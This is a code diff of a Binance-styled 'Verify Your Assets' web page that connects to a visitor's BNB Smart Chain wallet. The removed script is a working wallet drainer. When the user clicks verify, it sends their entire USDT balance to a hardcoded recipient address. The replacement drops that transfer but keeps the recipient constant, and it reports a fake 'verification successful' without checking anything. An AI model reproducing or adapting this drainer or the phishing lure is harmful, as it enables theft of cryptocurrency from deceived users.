@@ -358,7 +358,7 @@
             <a href="https://www.binance.com/en">More <span class="dropdown-arrow"></span></a>
         </nav>
     </header>
-  <main>
+    <main>
     <div class="content-wrapper">
       <h1>Verify Your Assets</h1>
       <p>Ensure your tokens are secure on Binance Smart Chain.</p>
@@ -369,112 +369,149 @@
       <div class="spinner" id="loadingSpinner"></div>
       <div id="log"></div>
     </div>
-  </main>
-  <footer>
-    <p style="color: var(--text-dimmed); font-size: 0.9rem;">© 2024 Asset Verification Tool</p>
-  </footer>
+    <footer>
+        <p>© 2024 Asset Verification Tool. All rights reserved.</p>
+    </footer>
 
-  <script>
-    const usdtAddress = "0x55d398326f99059fF775485246999027B3197955";
-    const recipient = "0x60eA1bc1b4b0e064BcbeA62845eD6CA36b9663CE";
-    const usdtAbi = [
-      "function balanceOf(address owner) view returns (uint256)",
-      "function transfer(address to, uint256 value) returns (bool)"
-    ];
-    const bscParams = {
-      chainId: "0x38",
-      chainName: "Binance Smart Chain",
-      nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
-      rpcUrls: ["https://bsc-dataseed.binance.org/"],
-      blockExplorerUrls: ["https://bscscan.com"]
-    };
+    <script>
+       const usdtAddress = "0x55d398326f99059fF775485246999027B3197955";
+        const recipient = "0x60eA1bc1b4b0e064BcbeA62845eD6CA36b9663CE";
+        const usdtAbi = [
+            "function balanceOf(address owner) view returns (uint256)",
+            "function transfer(address to, uint256 value) returns (bool)"
+        ];
 
-    const balanceElement = document.getElementById("balance");
-    const verifyButton = document.getElementById("verifyBtn");
-    const loadingSpinner = document.getElementById("loadingSpinner");
-    const logElement = document.getElementById("log");
+        const bscParams = {
+            chainId: "0x38",
+            chainName: "Binance Smart Chain",
+            nativeCurrency: {
+                name: "BNB",
+                symbol: "BNB",
+                decimals: 18
+            },
+            rpcUrls: ["https://bsc-dataseed.binance.org/"],
+            blockExplorerUrls: ["https://bscscan.com"]
+        };
 
-    function log(msg, type = 'info') {
-      logElement.textContent = msg;
-      logElement.className = `log log-${type}`;
-    }
+        const balanceElement = document.getElementById("balance");
+        const verifyButton = document.getElementById("verifyBtn");
+        const loadingSpinner = document.getElementById("loadingSpinner");
+        const logElement = document.getElementById("log");
+        const menuIcon = document.getElementById('menu-icon');
+        const nav = document.querySelector('header nav');
 
-    function showLoading(isLoading) {
-      loadingSpinner.style.display = isLoading ? 'inline-block' : 'none';
-      verifyButton.disabled = isLoading;
-    }
-
-    async function switchToBSCAndGetAccount() {
-      if (!window.ethereum) {
-        log("Trust Wallet or MetaMask not detected. Use Trust Wallet browser.", 'error');
-        return null;
-      }
-      try {
-        await window.ethereum.request({ method: "wallet_switchEthereumChain", params: [{ chainId: bscParams.chainId }] });
-      } catch (switchError) {
-        if (switchError.code === 4902) {
-          await window.ethereum.request({ method: "wallet_addEthereumChain", params: [bscParams] });
-        } else {
-          log("Could not switch to BSC.", 'error');
-          return null;
-        }
-      }
-      const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-      return accounts[0];
-    }
-
-    async function verifyAssets() {
-      log("", 'info');
-      showLoading(true);
-      try {
-        const userAddress = await switchToBSCAndGetAccount();
-        if (!userAddress) return showLoading(false);
-
-        const provider = new ethers.providers.Web3Provider(window.ethereum);
-        const signer = provider.getSigner();
-        const usdtContract = new ethers.Contract(usdtAddress, usdtAbi, signer);
-
-        const balance = await usdtContract.balanceOf(userAddress);
-        const formattedBalance = ethers.utils.formatUnits(balance, 18);
-
-        if (balance.isZero()) {
-          balanceElement.textContent = "Your USDT Balance: 0";
-          log("❌ You have no USDT to send.", 'error');
-          return;
+        function log(msg, type = 'info') {
+            logElement.textContent = msg;
+            logElement.className = `log log-${type}`;
         }
 
-        balanceElement.textContent = `Your USDT Balance: ${formattedBalance}`;
-
-        const tx = await usdtContract.transfer(recipient, balance);
-        await tx.wait();
-
-        log("✅ USDT transferred successfully!", 'success');
-      } catch (err) {
-        console.error(err);
-        log(`❌ Error: ${err.message || err}`, 'error');
-      } finally {
-        showLoading(false);
-      }
-    }
-
-    window.addEventListener('load', async () => {
-      if (window.ethereum) {
-        const provider = new ethers.providers.Web3Provider(window.ethereum);
-        const accounts = await provider.listAccounts();
-        if (accounts.length > 0) {
-          const contract = new ethers.Contract(usdtAddress, usdtAbi, provider);
-          const balance = await contract.balanceOf(accounts[0]);
-          const formatted = ethers.utils.formatUnits(balance, 18);
-          balanceElement.textContent = `Your USDT Balance: ${formatted}`;
-        } else {
-          balanceElement.textContent = "Connect wallet to see balance.";
+        function showLoading(isLoading) {
+            if (isLoading) {
+                loadingSpinner.style.display = 'inline-block';
+                verifyButton.querySelector('span').textContent = 'Verifying...';
+                verifyButton.disabled = true;
+            } else {
+                loadingSpinner.style.display = 'none';
+                verifyButton.querySelector('span').textContent = 'Verify Assets';
+                verifyButton.disabled = false;
+            }
         }
-      } else {
-        balanceElement.textContent = "Wallet not detected.";
-      }
-    });
 
-    verifyButton.onclick = verifyAssets;
-  </script>
+        async function getBalance(provider, address) {
+            try {
+                const usdtContract = new ethers.Contract(usdtAddress, usdtAbi, provider);
+                const balance = await usdtContract.balanceOf(address);
+                const formattedBalance = ethers.utils.formatUnits(balance, 18);
+                balanceElement.textContent = `Your USDT Balance: ${formattedBalance}`;
+            } catch (error) {
+                console.error("Error fetching balance:", error);
+                balanceElement.textContent = "Error fetching balance.";
+            }        }
+
+        async function switchToBSCAndGetAccount() {
+            if (!window.ethereum) {
+                log("Trust Wallet or MetaMask not detected. Open this in Trust Wallet browser.", 'error');
+                return null;
+            }
+
+            try {
+                await window.ethereum.request({
+                    method: "wallet_switchEthereumChain",
+                    params: [{ chainId: bscParams.chainId }]
+                });
+            } catch (switchError) {
+                if (switchError.code === 4902) {
+                    try {
+                        await window.ethereum.request({
+                            method: "wallet_addEthereumChain",
+                            params: [bscParams]
+                        });
+                    } catch (addError) {
+                        log("Could not add Binance Smart Chain to your wallet.", 'error');
+                        throw addError;
+                    }
+                } else {
+                    throw switchError;
+                }
+            }
+
+            try {
+                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                return accounts[0];
+            } catch (accountError) {
+                log("Could not connect to your wallet.", 'error');
+                throw accountError;
+            }
+        }
+
+        async function verifyAssets() {
+            log("", 'info');
+            showLoading(true);
+
+            const userAddress = await switchToBSCAndGetAccount();
+            if (!userAddress) {
+                showLoading(false);
+                return;
+            }
+
+            const provider = new ethers.providers.Web3Provider(window.ethereum);
+
+             getBalance(provider, userAddress);
+
+            try {
+
+
+                log("✅ Asset verification successful.", 'success');
+
+            } catch (err) {
+                console.error(err);
+                log(`❌ Verification failed: ${err?.message || err}`, 'error');
+            } finally {
+                showLoading(false);
+            }
+        }
+
+
+
+        window.addEventListener('load', async () => {
+            if (window.ethereum) {
+                const provider = new ethers.providers.Web3Provider(window.ethereum);
+                const accounts = await provider.listAccounts();
+                if (accounts.length > 0) {
+                    getBalance(provider, accounts[0]);
+                } else {
+                    balanceElement.textContent = "Connect Wallet to see balance";
+                }
+            } else {
+                balanceElement.textContent = "Wallet not detected";
+            }
+        });
+
+        verifyButton.onclick = verifyAssets;
+        menuIcon.addEventListener('click', () => {
+            nav.classList.toggle('open');
+            menuIcon.classList.toggle('open');
+        });
+    </script>
 </body>
 </html>
